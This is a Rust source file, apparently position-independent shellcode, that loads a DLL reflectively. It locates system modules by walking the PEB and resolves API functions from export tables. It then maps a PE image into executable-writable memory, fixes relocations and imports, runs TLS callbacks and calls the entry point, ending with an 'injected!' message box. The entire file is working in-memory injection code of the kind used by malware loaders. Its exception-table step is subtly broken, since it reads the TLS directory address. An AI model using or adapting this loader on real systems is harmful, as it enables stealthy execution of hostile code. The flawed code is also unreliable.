#![allow(dead_code)]
#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]
#![allow(overflowing_literals)]
#![no_std]
#![no_main]
#![feature(asm)]

mod binding;
use binding::*;

use core::mem::{size_of, transmute};
use utf16_literal::utf16;

#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {}
}

pub type PLoadLibraryA = unsafe extern "system" fn(LPCSTR) -> HMODULE;
//pub type PLdrLoadDll = unsafe extern "system" fn(PWCHAR, ULONG, *mut UNICODE_STRING, PHANDLE) -> NTSTATUS;
pub type PGetProcAddress = unsafe extern "system" fn(HMODULE, LPCSTR) -> LPVOID;
//pub type PLdrGetProcAddress = unsafe extern "system" fn(HMODULE, *mut ANSI_STRING, WORD, *mut PVOID) -> NTSTATUS;
pub type PVirtualAlloc = unsafe extern "system" fn(LPVOID, SIZE_T, DWORD, DWORD) -> LPVOID;
pub type PNtFlushInstructionCache = unsafe extern "system" fn(HANDLE, PVOID, SIZE_T) -> NTSTATUS;
pub type PRtlAddFunctionTable = unsafe extern "system" fn(PRUNTIME_FUNCTION, DWORD, DWORD64) -> BOOLEAN;
pub type PMessageBoxA = unsafe extern "system" fn(h: PVOID, text: LPCSTR, cation: LPCSTR, t: u32) -> u32;

pub type Main = extern "system" fn();
pub type DllMain = unsafe extern "system" fn(HINSTANCE, DWORD, LPVOID) -> BOOL;

#[no_mangle]
pub unsafe extern "C" fn main(dll: LPVOID) {
    let addr = dll;

    asm!("and rsp, ~0xf");

    let dos_header = addr as *mut IMAGE_DOS_HEADER;
    let nt_header = (addr as u64 + (*dos_header).e_lfanew as u64) as *mut IMAGE_NT_HEADERS64;

    let kernel32 = get_module_by_name(utf16!("KERNEL32.DLL\x00").as_ptr());
    let ntdll = get_module_by_name(utf16!("ntdll.dll\x00").as_ptr());

    let LoadLibraryA: PLoadLibraryA = transmute(get_func_by_name(kernel32, "LoadLibraryA\x00".as_ptr() as _));
    let GetProcAddress: PGetProcAddress = transmute(get_func_by_name(kernel32, "GetProcAddress\x00".as_ptr() as _));
    let VirtualAlloc: PVirtualAlloc = transmute(get_func_by_name(kernel32, "VirtualAlloc\x00".as_ptr() as _));

    let RtlAddFunctionTable: PRtlAddFunctionTable = transmute(get_func_by_name(kernel32, "RtlAddFunctionTable\x00".as_ptr() as _));
    let NtFlushInstructionCache: PNtFlushInstructionCache = transmute(get_func_by_name(ntdll, "NtFlushInstructionCache\x00".as_ptr() as _));

    // for debug
    let u32_dll = LoadLibraryA("user32.dll\x00".as_ptr() as _);
    let MessageBoxA: PMessageBoxA = transmute(GetProcAddress(u32_dll, "MessageBoxA\x00".as_ptr() as _));

    let mut virtual_image_base_address = VirtualAlloc(
        (*nt_header).OptionalHeader.ImageBase as _,
        (*nt_header).OptionalHeader.SizeOfImage as _,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE,
    );

    if virtual_image_base_address == NULL {
        virtual_image_base_address = VirtualAlloc(
            NULL,
            (*nt_header).OptionalHeader.SizeOfImage as _,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        )
    }

    for i in 0..(*nt_header).OptionalHeader.SizeOfHeaders {
        *((virtual_image_base_address as u64 + i as u64) as *mut u8) =
            *((addr as u64 + i as u64) as *mut u8)
    }

    let mut section_header = ((&(*nt_header).OptionalHeader as *const _ as *mut c_void) as u64
        + (*nt_header).FileHeader.SizeOfOptionalHeader as u64)
        as *mut IMAGE_SECTION_HEADER;

    for _ in 0..(*nt_header).FileHeader.NumberOfSections {
        let dest_addr = (virtual_image_base_address as u64
            + (*section_header).VirtualAddress as u64) as *mut u8;
        let section_data = (addr as u64 + (*section_header).PointerToRawData as u64) as *mut u8;
        let data_size = (*section_header).SizeOfRawData;

        for i in 0..data_size {
            *((dest_addr as u64 + i as u64) as *mut u8) =
                *((section_data as u64 + i as u64) as *mut u8);
        }

        section_header = (section_header as u64 + size_of::<IMAGE_SECTION_HEADER>() as u64) as _;
    }

    let delta = virtual_image_base_address as u64 - (*nt_header).OptionalHeader.ImageBase as u64;
    let reloc_data_dir =
        &(*nt_header).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];

    if delta != 0x0 && reloc_data_dir.Size != 0 {
        let mut reloc = (virtual_image_base_address as u64 + reloc_data_dir.VirtualAddress as u64) as *mut IMAGE_BASE_RELOCATION;

        while (*reloc).VirtualAddress != 0x0 {
            let mut reloc_block = (reloc as u64 + 8) as *mut u16;

            while reloc_block as u64 != reloc as u64 + (*reloc).SizeOfBlock as u64 {
                let block_type = ((*reloc_block) >> 12) as u64;

                if block_type != 0 {
                    let patch = virtual_image_base_address as u64 + (*reloc).VirtualAddress as u64 + ((*reloc_block) & 0xfff) as u64;
                    *(patch as *mut u64) = *(patch as *mut u64) + delta;
                }

                reloc_block = (reloc_block as u64 + 2) as _;
            }

            reloc = reloc_block as _;
        }
    }

    let import_dir_info =
        &(*nt_header).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    let mut import_dir = (virtual_image_base_address as u64 + import_dir_info.VirtualAddress as u64)
        as *mut IMAGE_IMPORT_DESCRIPTOR;

    while (*import_dir).Name != 0x0 {
        let lib_name = (virtual_image_base_address as u64 + (*import_dir).Name as u64) as LPCSTR;
        let lib = LoadLibraryA(lib_name);

        let mut orig_thunk = if *(*import_dir).u.OriginalFirstThunk() != 0 {
            (virtual_image_base_address as u64
                + *(*import_dir).u.OriginalFirstThunk() as u64)
                as *mut IMAGE_THUNK_DATA64
        } else {
            (virtual_image_base_address as u64 + (*import_dir).FirstThunk as u64)
                as *mut IMAGE_THUNK_DATA64
        };

        let mut thunk = (virtual_image_base_address as u64 + (*import_dir).FirstThunk as u64)
            as *mut IMAGE_THUNK_DATA64;

        while (*orig_thunk).u1.Function() != &0x0 {
            if IMAGE_SNAP_BY_ORDINAL64(*(*orig_thunk).u1.Ordinal()) {
                let fn_ordinal = IMAGE_ORDINAL64(*(*orig_thunk).u1.Ordinal()) as LPCSTR;
                *(*thunk).u1.Function_mut() = GetProcAddress(lib, fn_ordinal) as _;
            } else {
                let fn_name = (virtual_image_base_address as u64 + *(*orig_thunk).u1.AddressOfData())
                    as *mut IMAGE_IMPORT_BY_NAME;
                *(*thunk).u1.Function_mut() = GetProcAddress(lib, &(*fn_name).Name[0] as *const _ as *mut _) as _;
            }

            thunk = thunk.offset(1);
            orig_thunk = orig_thunk.offset(1);
        }

        import_dir = (import_dir as u64 + size_of::<IMAGE_IMPORT_DESCRIPTOR>() as u64) as _;
    }

    let import_dir_info =
        &(*nt_header).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT as usize];
    let mut import_dir = (virtual_image_base_address as u64 + import_dir_info.VirtualAddress as u64)
        as *mut IMAGE_DELAYLOAD_DESCRIPTOR;

    if import_dir_info.Size > 0 {
        while (*import_dir).DllNameRVA != 0x0 {
            let lib_name = (virtual_image_base_address as u64 + (*import_dir).DllNameRVA as u64) as LPCSTR;
            let lib = LoadLibraryA(lib_name);
    
            let mut orig_thunk = (virtual_image_base_address as u64 + (*import_dir).ImportNameTableRVA as u64)
                as *mut IMAGE_THUNK_DATA64;
    
            let mut thunk = (virtual_image_base_address as u64 + (*import_dir).ImportAddressTableRVA as u64)
                as *mut IMAGE_THUNK_DATA64;
    
            while (*orig_thunk).u1.Function() != &0x0 {
                if IMAGE_SNAP_BY_ORDINAL64(*(*orig_thunk).u1.Ordinal()) {
                    let fn_ordinal = IMAGE_ORDINAL64(*(*orig_thunk).u1.Ordinal()) as LPCSTR;
                    *(*thunk).u1.Function_mut() = GetProcAddress(lib, fn_ordinal) as _;
                } else {
                    let fn_name = (virtual_image_base_address as u64 + *(*orig_thunk).u1.AddressOfData())
                        as *mut IMAGE_IMPORT_BY_NAME;
                    *(*thunk).u1.Function_mut() = GetProcAddress(lib, &(*fn_name).Name[0] as *const _ as *mut _) as _;
                }
    
                thunk = thunk.offset(1);
                orig_thunk = orig_thunk.offset(1);
            }
    
            import_dir = (import_dir as u64 + size_of::<IMAGE_DELAYLOAD_DESCRIPTOR>() as u64) as _;
        }
    }

    NtFlushInstructionCache(-1 as _, NULL, 0);

    let tls_data = &(*nt_header).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS as usize];
    if tls_data.Size > 0 {
        let tls_dir = (virtual_image_base_address as u64 + tls_data.VirtualAddress as u64)
            as *mut IMAGE_TLS_DIRECTORY64;
        let mut callback = (*tls_dir).AddressOfCallBacks as *const *const c_void;

        while !(*callback).is_null() {
            transmute::<*const c_void, DllMain>(*callback)(virtual_image_base_address as _, 1, 0 as _);
            callback = callback.offset(1);
        }
    }

    let exception_dir_info =
        &(*nt_header).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION as usize];

    if exception_dir_info.Size > 0 {
        let rf_entry = (virtual_image_base_address as u64 + tls_data.VirtualAddress as u64) as *mut IMAGE_RUNTIME_FUNCTION_ENTRY;
        RtlAddFunctionTable(rf_entry, (exception_dir_info.Size / size_of::<IMAGE_RUNTIME_FUNCTION_ENTRY>() as u32) - 1, virtual_image_base_address as _);
    }

    let entrypoint =
        virtual_image_base_address as u64 + (*nt_header).OptionalHeader.AddressOfEntryPoint as u64;

    transmute::<u64, DllMain>(entrypoint)(0 as _, 1, 0 as _);

    MessageBoxA(
        NULL,
        "injected!\0".as_ptr() as *const i8,
        "From shellcode\0".as_ptr() as _,
        0x00,
    );
}

unsafe fn get_module_by_name(module_name: *const u16) -> PVOID {
    let mut ppeb = NULL as *mut PEB;
    asm!(
        "mov {}, gs:[0x60]",
        out(reg) ppeb,
    );

    let p_peb_ldr_data = (*ppeb).Ldr;
    let mut module_list =
        (*p_peb_ldr_data).InLoadOrderModuleList.Flink as *mut LDR_DATA_TABLE_ENTRY;

    while (*module_list).DllBase != NULL {
        let dll_base_address = (*module_list).DllBase;
        let dll_name = (*module_list).BaseDllName.Buffer;
        let nt_header = (dll_base_address as u64
            + (*(dll_base_address as *mut IMAGE_DOS_HEADER)).e_lfanew as u64)
            as *mut IMAGE_NT_HEADERS64;
        let export_dir_rva = (*nt_header).OptionalHeader.DataDirectory[0].VirtualAddress as u64;

        if compare_raw_str(module_name, dll_name) {
            return (*module_list).DllBase;
        }

        module_list = (*module_list).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
    }

    NULL
}

unsafe fn get_func_by_name(module: PVOID, func_name: *const u8) -> PVOID {
    let nt_header = (module as u64
        + (*(module as *mut IMAGE_DOS_HEADER)).e_lfanew as u64)
        as *mut IMAGE_NT_HEADERS64;
    let export_dir_rva = (*nt_header).OptionalHeader.DataDirectory[0].VirtualAddress as u64;

    if export_dir_rva == 0x0 {
        return NULL;
    };

    let export_dir = (module as u64 + export_dir_rva) as *mut IMAGE_EXPORT_DIRECTORY;

    let number_of_names = (*export_dir).NumberOfNames;
    let addr_of_funcs = (*export_dir).AddressOfFunctions;
    let addr_of_names = (*export_dir).AddressOfNames;
    let addr_of_ords = (*export_dir).AddressOfNameOrdinals;
    for i in 0..number_of_names {
        let name_rva_p: *const DWORD =
            (module as *const u8).offset((addr_of_names + i * 4) as isize) as *const _;
        let name_index_p: *const WORD =
            (module as *const u8).offset((addr_of_ords + i * 2) as isize) as *const _;
        let name_index = name_index_p.as_ref().unwrap();
        let mut off: u32 = (4 * name_index) as u32;
        off = off + addr_of_funcs;
        let func_rva: *const DWORD = (module as *const u8).offset(off as _) as *const _;

        let name_rva = name_rva_p.as_ref().unwrap();
        let curr_name = (module as *const u8).offset(*name_rva as isize);

        if *curr_name == 0 {
            continue;
        }
        if compare_raw_str(func_name, curr_name) {
            let res = (module as *const u8).offset(*func_rva as isize);
            return res as _;
        }
    }

    return NULL;
}

use num_traits::Num;
pub fn compare_raw_str<T>(s: *const T, u: *const T) -> bool
where
    T: Num,
{
    unsafe {
        let u_len = (0..).take_while(|&i| !(*u.offset(i)).is_zero()).count();
        let u_slice = core::slice::from_raw_parts(u, u_len);

        let s_len = (0..).take_while(|&i| !(*s.offset(i)).is_zero()).count();
        let s_slice = core::slice::from_raw_parts(s, s_len);

        if s_len != u_len {
            return false;
        }
        for i in 0..s_len {
            if s_slice[i] != u_slice[i] {
                return false;
            }
        }
        return true;
    }
}
